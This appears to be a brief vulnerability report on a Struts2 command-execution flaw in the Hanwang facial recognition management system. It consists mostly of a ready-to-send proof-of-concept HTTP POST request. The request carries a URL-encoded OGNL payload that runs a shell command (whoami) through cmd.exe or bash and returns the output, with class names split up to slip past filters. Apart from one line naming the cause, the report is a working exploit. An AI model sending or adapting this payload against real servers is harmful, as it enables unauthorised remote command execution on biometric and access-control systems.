## Hanwang facial recognition management system struts2 command execution vulnerability

> Due to the use of the vulnerable struts2 framework
>
> Causing command execution vulnerabilities

- URI

```
/system/announcementlnfo.whtml
```

- POC

```
POST /system/announcementlnfo.whtml HTTP/1.1
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Host: host
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 1112

redirect%3a%24%7b%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29%2c%23_memberAccess%3dnew+com.opensymphony.xwork2.ognl.SecurityMemberAccess%28true%29%2c%23commods%3d%27whoami%27%2c%23iswin%3d%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%2c%23outmansec%3d%28%23iswin%3f%28new+java.lang.String%5b%5d%7b%27cmd.exe%27%2c%27%2fc%27%2c%23commods%7d%29%3a%28new+java.lang.String%5b%5d%7b%27bash%27%2c%27-c%27%2c%23commods%7d%29%29%2c%23a%3dnew+java.lang.ProcessBuilder%28%23outmansec%29.start%28%29.getInputStream%28%29%2c%23s%3dnew+java.util.Scanner%28%23a%29.useDelimiter%28%27%5c%5cAAAA%27%29%2c%23str%3d%23s.hasNext%28%29%3f%23s.next%28%29%3a%27%27%2c%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29%2c%23resp.setCharacterEncoding%28%27GB2312%27%29%2c%23resp.getWriter%28%29.println%28%23str%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29%7d
```

![image-20240820172641301](https://github.com/witnesser2000/VulnerabilityReport/blob/main/imgs/image-20240820172641301.png?raw=true)